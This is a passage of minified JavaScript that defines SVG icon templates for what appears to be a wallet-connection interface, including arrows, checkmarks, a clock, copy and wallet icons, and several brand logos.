    d="M7.0023 0.875C7.48571 0.875 7.8776 1.26675 7.8776 1.75V6.125H12.2541C12.7375 6.125 13.1294 6.51675 13.1294 7C13.1294 7.48325 12.7375 7.875 12.2541 7.875H7.8776V12.25C7.8776 12.7332 7.48571 13.125 7.0023 13.125C6.51889 13.125 6.12701 12.7332 6.12701 12.25V7.875H1.75054C1.26713 7.875 0.875244 7.48325 0.875244 7C0.875244 6.51675 1.26713 6.125 1.75054 6.125H6.12701V1.75C6.12701 1.26675 6.51889 0.875 7.0023 0.875Z"
    fill="#667dff"
  /></svg
>`,pNe=xe`<svg fill="none" viewBox="0 0 24 24">
  <path
    style="fill: var(--wui-color-accent-100);"
    d="M10.2 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM10.2 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0Z"
  />
</svg>`,gNe=xe`
<svg width="36" height="36">
  <path
    d="M28.724 0H7.271A7.269 7.269 0 0 0 0 7.272v21.46A7.268 7.268 0 0 0 7.271 36H28.73A7.272 7.272 0 0 0 36 28.728V7.272A7.275 7.275 0 0 0 28.724 0Z"
    fill="url(#a)"
  />
  <path
    d="m17.845 8.271.729-1.26a1.64 1.64 0 1 1 2.843 1.638l-7.023 12.159h5.08c1.646 0 2.569 1.935 1.853 3.276H6.434a1.632 1.632 0 0 1-1.638-1.638c0-.909.73-1.638 1.638-1.638h4.176l5.345-9.265-1.67-2.898a1.642 1.642 0 0 1 2.844-1.638l.716 1.264Zm-6.317 17.5-1.575 2.732a1.64 1.64 0 1 1-2.844-1.638l1.17-2.025c1.323-.41 2.398-.095 3.249.931Zm13.56-4.954h4.262c.909 0 1.638.729 1.638 1.638 0 .909-.73 1.638-1.638 1.638h-2.367l1.597 2.772c.45.788.185 1.782-.602 2.241a1.642 1.642 0 0 1-2.241-.603c-2.69-4.666-4.711-8.159-6.052-10.485-1.372-2.367-.391-4.743.576-5.549 1.075 1.846 2.682 4.631 4.828 8.348Z"
    fill="#fff"
  />
  <defs>
    <linearGradient id="a" x1="18" y1="0" x2="18" y2="36" gradientUnits="userSpaceOnUse">
      <stop stop-color="#18BFFB" />
      <stop offset="1" stop-color="#2072F3" />
    </linearGradient>
  </defs>
</svg>`,mNe=xe`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#000" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M28.77 23.3c-.69 1.99-2.75 5.52-4.87 5.56-1.4.03-1.86-.84-3.46-.84-1.61 0-2.12.81-3.45.86-2.25.1-5.72-5.1-5.72-9.62 0-4.15 2.9-6.2 5.42-6.25 1.36-.02 2.64.92 3.47.92.83 0 2.38-1.13 4.02-.97.68.03 2.6.28 3.84 2.08-3.27 2.14-2.76 6.61.75 8.25ZM24.2 7.88c-2.47.1-4.49 2.69-4.2 4.84 2.28.17 4.47-2.39 4.2-4.84Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,wNe=xe`<svg
  fill="none"
  viewBox="0 0 21 20"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10.5 2.42908C6.31875 2.42908 2.92859 5.81989 2.92859 10.0034C2.92859 14.1869 6.31875 17.5777 10.5 17.5777C14.6813 17.5777 18.0714 14.1869 18.0714 10.0034C18.0714 5.81989 14.6813 2.42908 10.5 2.42908ZM0.928589 10.0034C0.928589 4.71596 5.21355 0.429077 10.5 0.429077C15.7865 0.429077 20.0714 4.71596 20.0714 10.0034C20.0714 15.2908 15.7865 19.5777 10.5 19.5777C5.21355 19.5777 0.928589 15.2908 0.928589 10.0034ZM10.5 5.75003C11.0523 5.75003 11.5 6.19774 11.5 6.75003L11.5 10.8343L12.7929 9.54137C13.1834 9.15085 13.8166 9.15085 14.2071 9.54137C14.5976 9.9319 14.5976 10.5651 14.2071 10.9556L11.2071 13.9556C10.8166 14.3461 10.1834 14.3461 9.79291 13.9556L6.79291 10.9556C6.40239 10.5651 6.40239 9.9319 6.79291 9.54137C7.18343 9.15085 7.8166 9.15085 8.20712 9.54137L9.50002 10.8343L9.50002 6.75003C9.50002 6.19774 9.94773 5.75003 10.5 5.75003Z"
    clip-rule="evenodd"
  /></svg
>`,bNe=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 1.99a1 1 0 0 1 1 1v7.58l2.46-2.46a1 1 0 0 1 1.41 1.42L7.7 13.69a1 1 0 0 1-1.41 0L2.12 9.53A1 1 0 0 1 3.54 8.1L6 10.57V3a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`,vNe=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M13 7.99a1 1 0 0 1-1 1H4.4l2.46 2.46a1 1 0 1 1-1.41 1.41L1.29 8.7a1 1 0 0 1 0-1.41L5.46 3.1a1 1 0 0 1 1.41 1.42L4.41 6.99H12a1 1 0 0 1 1 1Z"
    clip-rule="evenodd"
  />
</svg>`,yNe=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M1 7.99a1 1 0 0 1 1-1h7.58L7.12 4.53A1 1 0 1 1 8.54 3.1l4.16 4.17a1 1 0 0 1 0 1.41l-4.16 4.17a1 1 0 1 1-1.42-1.41l2.46-2.46H2a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,xNe=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 13.99a1 1 0 0 1-1-1V5.4L3.54 7.86a1 1 0 0 1-1.42-1.41L6.3 2.28a1 1 0 0 1 1.41 0l4.17 4.17a1 1 0 1 1-1.41 1.41L8 5.4v7.59a1 1 0 0 1-1 1Z"
    clip-rule="evenodd"
  />
</svg>`,CNe=xe`<svg
  xmlns="http://www.w3.org/2000/svg"
  width="12"
  height="13"
  viewBox="0 0 12 13"
  fill="none"
>
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M5.61391 1.57124C5.85142 1.42873 6.14813 1.42873 6.38564 1.57124L11.0793 4.38749C11.9179 4.89067 11.5612 6.17864 10.5832 6.17864H9.96398V10.0358H10.2854C10.6996 10.0358 11.0354 10.3716 11.0354 10.7858C11.0354 11.2 10.6996 11.5358 10.2854 11.5358H1.71416C1.29995 11.5358 0.964172 11.2 0.964172 10.7858C0.964172 10.3716 1.29995 10.0358 1.71416 10.0358H2.03558L2.03558 6.17864H1.41637C0.438389 6.17864 0.0816547 4.89066 0.920263 4.38749L5.61391 1.57124ZM3.53554 6.17864V10.0358H5.24979V6.17864H3.53554ZM6.74976 6.17864V10.0358H8.46401V6.17864H6.74976ZM8.64913 4.67864H3.35043L5.99978 3.089L8.64913 4.67864Z"
    fill="currentColor"
  /></svg
>`,ENe=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4 6.4a1 1 0 0 1-.46.89 6.98 6.98 0 0 0 .38 6.18A7 7 0 0 0 16.46 7.3a1 1 0 0 1-.47-.92 7 7 0 0 0-12 .03Zm-2.02-.5a9 9 0 1 1 16.03 8.2A9 9 0 0 1 1.98 5.9Z"
    clip-rule="evenodd"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.03 8.63c-1.46-.3-2.72-.75-3.6-1.35l-.02-.01-.14-.11a1 1 0 0 1 1.2-1.6l.1.08c.6.4 1.52.74 2.69 1 .16-.99.39-1.88.67-2.65.3-.79.68-1.5 1.15-2.02A2.58 2.58 0 0 1 9.99 1c.8 0 1.45.44 1.92.97.47.52.84 1.23 1.14 2.02.29.77.52 1.66.68 2.64a8 8 0 0 0 2.7-1l.26-.18h.48a1 1 0 0 1 .12 2c-.86.51-2.01.91-3.34 1.18a22.24 22.24 0 0 1-.03 3.19c1.45.29 2.7.73 3.58 1.31a1 1 0 0 1-1.1 1.68c-.6-.4-1.56-.76-2.75-1-.15.8-.36 1.55-.6 2.2-.3.79-.67 1.5-1.14 2.02-.47.53-1.12.97-1.92.97-.8 0-1.45-.44-1.91-.97a6.51 6.51 0 0 1-1.15-2.02c-.24-.65-.44-1.4-.6-2.2-1.18.24-2.13.6-2.73.99a1 1 0 1 1-1.1-1.67c.88-.58 2.12-1.03 3.57-1.31a22.03 22.03 0 0 1-.04-3.2Zm2.2-1.7c.15-.86.34-1.61.58-2.24.24-.65.51-1.12.76-1.4.25-.28.4-.29.42-.29.03 0 .17.01.42.3.25.27.52.74.77 1.4.23.62.43 1.37.57 2.22a19.96 19.96 0 0 1-3.52 0Zm-.18 4.6a20.1 20.1 0 0 1-.03-2.62 21.95 21.95 0 0 0 3.94 0 20.4 20.4 0 0 1-.03 2.63 21.97 21.97 0 0 0-3.88 0Zm.27 2c.13.66.3 1.26.49 1.78.24.65.51 1.12.76 1.4.25.28.4.29.42.29.03 0 .17-.01.42-.3.25-.27.52-.74.77-1.4.19-.5.36-1.1.49-1.78a20.03 20.03 0 0 0-3.35 0Z"
    clip-rule="evenodd"
  />
</svg>`,_Ne=xe`<svg
  xmlns="http://www.w3.org/2000/svg"
  width="12"
  height="13"
  viewBox="0 0 12 13"
  fill="none"
>
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M4.16072 2C4.17367 2 4.18665 2 4.19968 2L7.83857 2C8.36772 1.99998 8.82398 1.99996 9.19518 2.04018C9.5895 2.0829 9.97577 2.17811 10.3221 2.42971C10.5131 2.56849 10.6811 2.73647 10.8198 2.92749C11.0714 3.27379 11.1666 3.66007 11.2094 4.0544C11.2496 4.42561 11.2496 4.88188 11.2495 5.41105V7.58896C11.2496 8.11812 11.2496 8.57439 11.2094 8.94561C11.1666 9.33994 11.0714 9.72621 10.8198 10.0725C10.6811 10.2635 10.5131 10.4315 10.3221 10.5703C9.97577 10.8219 9.5895 10.9171 9.19518 10.9598C8.82398 11 8.36772 11 7.83856 11H4.16073C3.63157 11 3.17531 11 2.80411 10.9598C2.40979 10.9171 2.02352 10.8219 1.67722 10.5703C1.48621 10.4315 1.31824 10.2635 1.17946 10.0725C0.927858 9.72621 0.832652 9.33994 0.78993 8.94561C0.749713 8.5744 0.749733 8.11813 0.749757 7.58896L0.749758 5.45C0.749758 5.43697 0.749758 5.42399 0.749757 5.41104C0.749733 4.88188 0.749713 4.42561 0.78993 4.0544C0.832652 3.66007 0.927858 3.27379 1.17946 2.92749C1.31824 2.73647 1.48621 2.56849 1.67722 2.42971C2.02352 2.17811 2.40979 2.0829 2.80411 2.04018C3.17531 1.99996 3.63157 1.99998 4.16072 2ZM2.96567 3.53145C2.69897 3.56034 2.60687 3.60837 2.55888 3.64324C2.49521 3.6895 2.43922 3.74549 2.39296 3.80916C2.35809 3.85715 2.31007 3.94926 2.28117 4.21597C2.26629 4.35335 2.25844 4.51311 2.25431 4.70832H9.74498C9.74085 4.51311 9.733 4.35335 9.71812 4.21597C9.68922 3.94926 9.6412 3.85715 9.60633 3.80916C9.56007 3.74549 9.50408 3.6895 9.44041 3.64324C9.39242 3.60837 9.30031 3.56034 9.03362 3.53145C8.75288 3.50103 8.37876 3.5 7.79961 3.5H4.19968C3.62053 3.5 3.24641 3.50103 2.96567 3.53145ZM9.74956 6.20832H2.24973V7.55C2.24973 8.12917 2.25076 8.5033 2.28117 8.78404C2.31007 9.05074 2.35809 9.14285 2.39296 9.19084C2.43922 9.25451 2.49521 9.31051 2.55888 9.35677C2.60687 9.39163 2.69897 9.43966 2.96567 9.46856C3.24641 9.49897 3.62053 9.5 4.19968 9.5H7.79961C8.37876 9.5 8.75288 9.49897 9.03362 9.46856C9.30032 9.43966 9.39242 9.39163 9.44041 9.35677C9.50408 9.31051 9.56007 9.25451 9.60633 9.19084C9.6412 9.14285 9.68922 9.05075 9.71812 8.78404C9.74854 8.5033 9.74956 8.12917 9.74956 7.55V6.20832ZM6.74963 8C6.74963 7.58579 7.08541 7.25 7.49961 7.25H8.2496C8.6638 7.25 8.99958 7.58579 8.99958 8C8.99958 8.41422 8.6638 8.75 8.2496 8.75H7.49961C7.08541 8.75 6.74963 8.41422 6.74963 8Z"
    fill="currentColor"
  /></svg
>`,SNe=xe`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M12.9576 2.23383C13.3807 2.58873 13.4361 3.21947 13.0812 3.64263L6.37159 11.6426C6.19161 11.8572 5.92989 11.9865 5.65009 11.999C5.3703 12.0115 5.09808 11.9062 4.89965 11.7085L0.979321 7.80331C0.588042 7.41354 0.586817 6.78038 0.976585 6.3891C1.36635 5.99782 1.99952 5.99659 2.3908 6.38636L5.53928 9.52268L11.5488 2.35742C11.9037 1.93426 12.5344 1.87893 12.9576 2.23383Z"
    clip-rule="evenodd"
  />
</svg>`,ANe=xe`<svg
  width="28"
  height="28"
  viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M25.5297 4.92733C26.1221 5.4242 26.1996 6.30724 25.7027 6.89966L12.2836 22.8997C12.0316 23.2001 11.6652 23.3811 11.2735 23.3986C10.8817 23.4161 10.5006 23.2686 10.2228 22.9919L2.38218 15.1815C1.83439 14.6358 1.83268 13.7494 2.37835 13.2016C2.92403 12.6538 3.81046 12.6521 4.35825 13.1978L11.1183 19.9317L23.5573 5.10036C24.0542 4.50794 24.9372 4.43047 25.5297 4.92733Z"
    fill="currentColor"/>
</svg>
`,INe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M1.46 4.96a1 1 0 0 1 1.41 0L8 10.09l5.13-5.13a1 1 0 1 1 1.41 1.41l-5.83 5.84a1 1 0 0 1-1.42 0L1.46 6.37a1 1 0 0 1 0-1.41Z"
    clip-rule="evenodd"
  />
</svg>`,TNe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M11.04 1.46a1 1 0 0 1 0 1.41L5.91 8l5.13 5.13a1 1 0 1 1-1.41 1.41L3.79 8.71a1 1 0 0 1 0-1.42l5.84-5.83a1 1 0 0 1 1.41 0Z"
    clip-rule="evenodd"
  />
</svg>`,kNe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.96 14.54a1 1 0 0 1 0-1.41L10.09 8 4.96 2.87a1 1 0 0 1 1.41-1.41l5.84 5.83a1 1 0 0 1 0 1.42l-5.84 5.83a1 1 0 0 1-1.41 0Z"
    clip-rule="evenodd"
  />
</svg>`,NNe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M14.54 11.04a1 1 0 0 1-1.41 0L8 5.92l-5.13 5.12a1 1 0 1 1-1.41-1.41l5.83-5.84a1 1 0 0 1 1.42 0l5.83 5.84a1 1 0 0 1 0 1.41Z"
    clip-rule="evenodd"
  />
</svg>`,PNe=xe`<svg width="36" height="36" fill="none">
  <path
    fill="#fff"
    fill-opacity=".05"
    d="M0 14.94c0-5.55 0-8.326 1.182-10.4a9 9 0 0 1 3.359-3.358C6.614 0 9.389 0 14.94 0h6.12c5.55 0 8.326 0 10.4 1.182a9 9 0 0 1 3.358 3.359C36 6.614 36 9.389 36 14.94v6.12c0 5.55 0 8.326-1.182 10.4a9 9 0 0 1-3.359 3.358C29.386 36 26.611 36 21.06 36h-6.12c-5.55 0-8.326 0-10.4-1.182a9 9 0 0 1-3.358-3.359C0 29.386 0 26.611 0 21.06v-6.12Z"
  />
  <path
    stroke="#fff"
    stroke-opacity=".05"
    d="M14.94.5h6.12c2.785 0 4.84 0 6.46.146 1.612.144 2.743.43 3.691.97a8.5 8.5 0 0 1 3.172 3.173c.541.948.826 2.08.971 3.692.145 1.62.146 3.675.146 6.459v6.12c0 2.785 0 4.84-.146 6.46-.145 1.612-.43 2.743-.97 3.691a8.5 8.5 0 0 1-3.173 3.172c-.948.541-2.08.826-3.692.971-1.62.145-3.674.146-6.459.146h-6.12c-2.784 0-4.84 0-6.46-.146-1.612-.145-2.743-.43-3.691-.97a8.5 8.5 0 0 1-3.172-3.173c-.541-.948-.827-2.08-.971-3.692C.5 25.9.5 23.845.5 21.06v-6.12c0-2.784 0-4.84.146-6.46.144-1.612.43-2.743.97-3.691A8.5 8.5 0 0 1 4.79 1.617C5.737 1.076 6.869.79 8.48.646 10.1.5 12.156.5 14.94.5Z"
  />
  <path
    fill="url(#a)"
    d="M17.998 10.8h12.469a14.397 14.397 0 0 0-24.938.001l6.234 10.798.006-.001a7.19 7.19 0 0 1 6.23-10.799Z"
  />
  <path
    fill="url(#b)"
    d="m24.237 21.598-6.234 10.798A14.397 14.397 0 0 0 30.47 10.798H18.002l-.002.006a7.191 7.191 0 0 1 6.237 10.794Z"
  />
  <path
    fill="url(#c)"
    d="M11.765 21.601 5.531 10.803A14.396 14.396 0 0 0 18.001 32.4l6.235-10.798-.004-.004a7.19 7.19 0 0 1-12.466.004Z"
  />
  <path fill="#fff" d="M18 25.2a7.2 7.2 0 1 0 0-14.4 7.2 7.2 0 0 0 0 14.4Z" />
  <path fill="#1A73E8" d="M18 23.7a5.7 5.7 0 1 0 0-11.4 5.7 5.7 0 0 0 0 11.4Z" />
  <defs>
    <linearGradient
      id="a"
      x1="6.294"
      x2="41.1"
      y1="5.995"
      y2="5.995"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#D93025" />
      <stop offset="1" stop-color="#EA4335" />
    </linearGradient>
    <linearGradient
      id="b"
      x1="20.953"
      x2="37.194"
      y1="32.143"
      y2="2.701"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#FCC934" />
      <stop offset="1" stop-color="#FBBC04" />
    </linearGradient>
    <linearGradient
      id="c"
      x1="25.873"
      x2="9.632"
      y1="31.2"
      y2="1.759"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#1E8E3E" />
      <stop offset="1" stop-color="#34A853" />
    </linearGradient>
  </defs>
</svg>`,$Ne=xe`<svg width="14" height="14" viewBox="0 0 14 14" fill="none">
  <path 
    fill-rule="evenodd" 
    clip-rule="evenodd" 
    d="M7.00235 2C4.24 2 2.00067 4.23858 2.00067 7C2.00067 9.76142 4.24 12 7.00235 12C9.7647 12 12.004 9.76142 12.004 7C12.004 4.23858 9.7647 2 7.00235 2ZM0 7C0 3.13401 3.13506 0 7.00235 0C10.8696 0 14.0047 3.13401 14.0047 7C14.0047 10.866 10.8696 14 7.00235 14C3.13506 14 0 10.866 0 7ZM7.00235 3C7.55482 3 8.00269 3.44771 8.00269 4V6.58579L9.85327 8.43575C10.2439 8.82627 10.2439 9.45944 9.85327 9.84996C9.46262 10.2405 8.82924 10.2405 8.43858 9.84996L6.29501 7.70711C6.10741 7.51957 6.00201 7.26522 6.00201 7V4C6.00201 3.44771 6.44988 3 7.00235 3Z" 
    fill="currentColor"
  />
</svg>`,RNe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z"
    clip-rule="evenodd"
  />
</svg>`,ONe=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10 3a7 7 0 0 0-6.85 8.44l8.29-8.3C10.97 3.06 10.49 3 10 3Zm3.49.93-9.56 9.56c.32.55.71 1.06 1.16 1.5L15 5.1a7.03 7.03 0 0 0-1.5-1.16Zm2.7 2.8-9.46 9.46a7 7 0 0 0 9.46-9.46ZM1.99 5.9A9 9 0 1 1 18 14.09 9 9 0 0 1 1.98 5.91Z"
    clip-rule="evenodd"
  />
</svg>`,BNe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M8 2a6 6 0 1 0 0 12A6 6 0 0 0 8 2ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm10.66-2.65a1 1 0 0 1 .23 1.06L9.83 9.24a1 1 0 0 1-.59.58l-2.83 1.06A1 1 0 0 1 5.13 9.6l1.06-2.82a1 1 0 0 1 .58-.59L9.6 5.12a1 1 0 0 1 1.06.23ZM7.9 7.89l-.13.35.35-.13.12-.35-.34.13Z"
    clip-rule="evenodd"
  />
</svg>`,MNe=xe`<svg
  xmlns="http://www.w3.org/2000/svg"
  width="16"
  height="16"
  viewBox="0 0 16 16"
  fill="none"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M9.21498 1.28565H10.5944C11.1458 1.28562 11.6246 1.2856 12.0182 1.32093C12.4353 1.35836 12.853 1.44155 13.2486 1.66724C13.7005 1.92498 14.0749 2.29935 14.3326 2.75122C14.5583 3.14689 14.6415 3.56456 14.6789 3.9817C14.7143 4.37531 14.7142 4.85403 14.7142 5.40545V6.78489C14.7142 7.33631 14.7143 7.81503 14.6789 8.20865C14.6415 8.62578 14.5583 9.04345 14.3326 9.43912C14.0749 9.89099 13.7005 10.2654 13.2486 10.5231C12.853 10.7488 12.4353 10.832 12.0182 10.8694C11.7003 10.8979 11.3269 10.9034 10.9045 10.9045C10.9034 11.3269 10.8979 11.7003 10.8694 12.0182C10.832 12.4353 10.7488 12.853 10.5231 13.2486C10.2654 13.7005 9.89099 14.0749 9.43912 14.3326C9.04345 14.5583 8.62578 14.6415 8.20865 14.6789C7.81503 14.7143 7.33631 14.7142 6.78489 14.7142H5.40545C4.85403 14.7142 4.37531 14.7143 3.9817 14.6789C3.56456 14.6415 3.14689 14.5583 2.75122 14.3326C2.29935 14.0749 1.92498 13.7005 1.66724 13.2486C1.44155 12.853 1.35836 12.4353 1.32093 12.0182C1.2856 11.6246 1.28562 11.1458 1.28565 10.5944V9.21498C1.28562 8.66356 1.2856 8.18484 1.32093 7.79122C1.35836 7.37409 1.44155 6.95642 1.66724 6.56074C1.92498 6.10887 2.29935 5.73451 2.75122 5.47677C3.14689 5.25108 3.56456 5.16789 3.9817 5.13045C4.2996 5.10192 4.67301 5.09645 5.09541 5.09541C5.09645 4.67302 5.10192 4.2996 5.13045 3.9817C5.16789 3.56456 5.25108 3.14689 5.47676 2.75122C5.73451 2.29935 6.10887 1.92498 6.56074 1.66724C6.95642 1.44155 7.37409 1.35836 7.79122 1.32093C8.18484 1.2856 8.66356 1.28562 9.21498 1.28565ZM5.09541 7.09552C4.68397 7.09667 4.39263 7.10161 4.16046 7.12245C3.88053 7.14757 3.78516 7.18949 3.74214 7.21403C3.60139 7.29431 3.48478 7.41091 3.4045 7.55166C3.37997 7.59468 3.33804 7.69005 3.31292 7.96999C3.28659 8.26345 3.28565 8.65147 3.28565 9.25708V10.5523C3.28565 11.1579 3.28659 11.5459 3.31292 11.8394C3.33804 12.1193 3.37997 12.2147 3.4045 12.2577C3.48478 12.3985 3.60139 12.5151 3.74214 12.5954C3.78516 12.6199 3.88053 12.6618 4.16046 12.6869C4.45393 12.7133 4.84195 12.7142 5.44755 12.7142H6.74279C7.3484 12.7142 7.73641 12.7133 8.02988 12.6869C8.30981 12.6618 8.40518 12.6199 8.44821 12.5954C8.58895 12.5151 8.70556 12.3985 8.78584 12.2577C8.81038 12.2147 8.8523 12.1193 8.87742 11.8394C8.89825 11.6072 8.90319 11.3159 8.90435 10.9045C8.48219 10.9034 8.10898 10.8979 7.79122 10.8694C7.37409 10.832 6.95641 10.7488 6.56074 10.5231C6.10887 10.2654 5.73451 9.89099 5.47676 9.43912C5.25108 9.04345 5.16789 8.62578 5.13045 8.20865C5.10194 7.89089 5.09645 7.51767 5.09541 7.09552ZM7.96999 3.31292C7.69005 3.33804 7.59468 3.37997 7.55166 3.4045C7.41091 3.48478 7.29431 3.60139 7.21403 3.74214C7.18949 3.78516 7.14757 3.88053 7.12245 4.16046C7.09611 4.45393 7.09517 4.84195 7.09517 5.44755V6.74279C7.09517 7.3484 7.09611 7.73641 7.12245 8.02988C7.14757 8.30981 7.18949 8.40518 7.21403 8.4482C7.29431 8.58895 7.41091 8.70556 7.55166 8.78584C7.59468 8.81038 7.69005 8.8523 7.96999 8.87742C8.26345 8.90376 8.65147 8.9047 9.25708 8.9047H10.5523C11.1579 8.9047 11.5459 8.90376 11.8394 8.87742C12.1193 8.8523 12.2147 8.81038 12.2577 8.78584C12.3985 8.70556 12.5151 8.58895 12.5954 8.4482C12.6199 8.40518 12.6618 8.30981 12.6869 8.02988C12.7133 7.73641 12.7142 7.3484 12.7142 6.74279V5.44755C12.7142 4.84195 12.7133 4.45393 12.6869 4.16046C12.6618 3.88053 12.6199 3.78516 12.5954 3.74214C12.5151 3.60139 12.3985 3.48478 12.2577 3.4045C12.2147 3.37997 12.1193 3.33804 11.8394 3.31292C11.5459 3.28659 11.1579 3.28565 10.5523 3.28565H9.25708C8.65147 3.28565 8.26345 3.28659 7.96999 3.31292Z"
    fill="#788181"
  /></svg
>`,DNe=xe`<svg fill="none" viewBox="0 0 14 6">
  <path style="fill: var(--wui-color-bg-150);" d="M0 1h14L9.21 5.12a3.31 3.31 0 0 1-4.49 0L0 1Z" />
  <path
    style="stroke: var(--wui-color-inverse-100);"
    stroke-opacity=".05"
    d="M1.33 1.5h11.32L8.88 4.75l-.01.01a2.81 2.81 0 0 1-3.8 0l-.02-.01L1.33 1.5Z"
  />
  <path
    style="fill: var(--wui-color-bg-150);"
    d="M1.25.71h11.5L9.21 3.88a3.31 3.31 0 0 1-4.49 0L1.25.71Z"
  />
</svg> `,LNe=xe` <svg fill="none" viewBox="0 0 13 4">
  <path fill="currentColor" d="M.5 0h12L8.9 3.13a3.76 3.76 0 0 1-4.8 0L.5 0Z" />
</svg>`,UNe=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M13.66 2H6.34c-1.07 0-1.96 0-2.68.08-.74.08-1.42.25-2.01.68a4 4 0 0 0-.89.89c-.43.6-.6 1.27-.68 2.01C0 6.38 0 7.26 0 8.34v.89c0 1.07 0 1.96.08 2.68.08.74.25 1.42.68 2.01a4 4 0 0 0 .89.89c.6.43 1.27.6 2.01.68a27 27 0 0 0 2.68.08h7.32a27 27 0 0 0 2.68-.08 4.03 4.03 0 0 0 2.01-.68 4 4 0 0 0 .89-.89c.43-.6.6-1.27.68-2.01.08-.72.08-1.6.08-2.68v-.89c0-1.07 0-1.96-.08-2.68a4.04 4.04 0 0 0-.68-2.01 4 4 0 0 0-.89-.89c-.6-.43-1.27-.6-2.01-.68C15.62 2 14.74 2 13.66 2ZM2.82 4.38c.2-.14.48-.25 1.06-.31C4.48 4 5.25 4 6.4 4h7.2c1.15 0 1.93 0 2.52.07.58.06.86.17 1.06.31a2 2 0 0 1 .44.44c.14.2.25.48.31 1.06.07.6.07 1.37.07 2.52v.77c0 1.15 0 1.93-.07 2.52-.06.58-.17.86-.31 1.06a2 2 0 0 1-.44.44c-.2.14-.48.25-1.06.32-.6.06-1.37.06-2.52.06H6.4c-1.15 0-1.93 0-2.52-.06-.58-.07-.86-.18-1.06-.32a2 2 0 0 1-.44-.44c-.14-.2-.25-.48-.31-1.06C2 11.1 2 10.32 2 9.17V8.4c0-1.15 0-1.93.07-2.52.06-.58.17-.86.31-1.06a2 2 0 0 1 .44-.44Z"
    clip-rule="evenodd"
  />
  <path fill="currentColor" d="M6.14 17.57a1 1 0 1 0 0 2h7.72a1 1 0 1 0 0-2H6.14Z" />
</svg>`,jNe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.07 1h.57a1 1 0 0 1 0 2h-.52c-.98 0-1.64 0-2.14.06-.48.05-.7.14-.84.24-.13.1-.25.22-.34.35-.1.14-.2.35-.25.83-.05.5-.05 1.16-.05 2.15v2.74c0 .99 0 1.65.05 2.15.05.48.14.7.25.83.1.14.2.25.34.35.14.1.36.2.84.25.5.05 1.16.05 2.14.05h.52a1 1 0 0 1 0 2h-.57c-.92 0-1.69 0-2.3-.07a3.6 3.6 0 0 1-1.8-.61c-.3-.22-.57-.49-.8-.8a3.6 3.6 0 0 1-.6-1.79C.5 11.11.5 10.35.5 9.43V6.58c0-.92 0-1.7.06-2.31a3.6 3.6 0 0 1 .62-1.8c.22-.3.48-.57.79-.79a3.6 3.6 0 0 1 1.8-.61C4.37 1 5.14 1 6.06 1ZM9.5 3a1 1 0 0 1 1.42 0l4.28 4.3a1 1 0 0 1 0 1.4L10.93 13a1 1 0 0 1-1.42-1.42L12.1 9H6.8a1 1 0 1 1 0-2h5.3L9.51 4.42a1 1 0 0 1 0-1.41Z"
    clip-rule="evenodd"
  />
</svg>`,FNe=xe`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5865F2" />
      <path
        fill="#fff"
